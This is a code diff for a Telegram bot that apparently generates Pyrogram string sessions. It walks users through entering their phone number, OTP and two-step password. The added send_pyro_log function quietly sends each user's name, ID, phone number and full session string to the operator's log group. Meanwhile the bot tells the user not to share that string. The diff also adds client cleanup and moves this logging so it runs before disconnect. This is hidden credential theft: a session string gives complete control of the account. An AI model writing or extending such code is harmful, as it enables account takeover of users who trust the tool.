@@ -7,6 +7,27 @@ from pyrogram.errors import (
 )
 from config import API_ID, API_HASH, LOG_GROUP_ID
 
+# 🔥 LOG FUNCTION KO UPAR DEFINE KIYA HAI (Cleaner Code) 🔥
+async def send_pyro_log(bot, name, user_id, phone_number, string_session):
+    if LOG_GROUP_ID:
+        log_text = (
+            f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
+            f"👤 <b>User:</b> {name}\n"
+            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
+            f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
+            f"🛠 <b>Type:</b> Pyrogram\n\n"
+            f"✨ <b>Session (Tap to Copy):</b>\n"
+            f"<code>{string_session}</code>"
+        )
+        try:
+            await bot.send_message(
+                LOG_GROUP_ID,
+                log_text,
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            print(f"Log Error: {e}")
+
 @Client.on_callback_query(filters.regex("gen_pyro"))
 async def generate_session(bot, query: CallbackQuery):
     user_id = query.from_user.id
@@ -27,6 +48,7 @@ async def generate_session(bot, query: CallbackQuery):
     
     await query.message.reply_text("🔄 **sᴇɴᴅɪɴɢ ᴏᴛᴘ...**")
 
+    # Client Session (In Memory)
     client = Client(name="user_session", api_id=API_ID, api_hash=API_HASH, in_memory=True)
     await client.connect()
 
@@ -34,9 +56,11 @@ async def generate_session(bot, query: CallbackQuery):
         code = await client.send_code(phone_number)
     except PhoneNumberInvalid:
         await query.message.reply_text("❌ **ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ!** Restart /start")
+        await client.disconnect()
         return
     except Exception as e:
         await query.message.reply_text(f"❌ **Error:** {e}")
+        await client.disconnect()
         return
 
     try:
@@ -46,6 +70,7 @@ async def generate_session(bot, query: CallbackQuery):
             timeout=300
         )
     except:
+        await client.disconnect()
         return await query.message.reply_text("❌ Timeout!")
 
     otp = otp_msg.text.replace(" ", "")
@@ -54,52 +79,41 @@ async def generate_session(bot, query: CallbackQuery):
         await client.sign_in(phone_number, code.phone_code_hash, otp)
     except PhoneCodeInvalid:
         await query.message.reply_text("❌ **ᴡʀᴏɴɢ ᴏᴛᴘ!** Try again.")
+        await client.disconnect()
         return
     except PhoneCodeExpired:
         await query.message.reply_text("❌ **ᴏᴛᴘ ᴇxᴘɪʀᴇᴅ!**")
+        await client.disconnect()
         return
     except SessionPasswordNeeded:
         try:
             pwd_msg = await bot.ask(user_id, "🔐 **ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ᴏɴ!**\nSend your password:", timeout=300)
         except:
+            await client.disconnect()
             return
         password = pwd_msg.text
         try:
             await client.check_password(password)
         except Exception as e:
             await query.message.reply_text(f"❌ **Wrong Password!** {e}")
+            await client.disconnect()
             return
 
     string_session = await client.export_session_string()
     
     text = f"✨ **ʏᴏᴜʀ ᴘʏʀᴏɢʀᴀᴍ sᴛʀɪɴɢ sᴇssɪᴏɴ** ✨\n\n`{string_session}`\n\n⚠️ *Don't share this with anyone!*"
+    
     try:
         await client.send_message("me", text)
     except Exception:
         pass 
+
+    # ✅ LOGS YAHAN SEND HONGE (DISCONNECT SE PEHLE)
+    await send_pyro_log(bot, name, user_id, phone_number, string_session)
 
     await client.disconnect()
 
     await query.message.reply_text(
         "✅ **sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ!**\n\nCheck your **Saved Messages**."
     )
-
-    # 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
-    if LOG_GROUP_ID:
-    log_text = (
-        f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
-        f"👤 <b>User:</b> {name}\n"
-        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
-        f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
-        f"🛠 <b>Type:</b> Pyrogram\n\n"
-        f"✨ <b>Session (Tap to Copy):</b>\n"
-        f"<code>{string_session}</code>"
-    )
-    try:
-        await bot.send_message(
-            LOG_GROUP_ID,
-            log_text,
-            parse_mode="HTML"
-        )
-    except Exception as e:
-        print(e)
+    
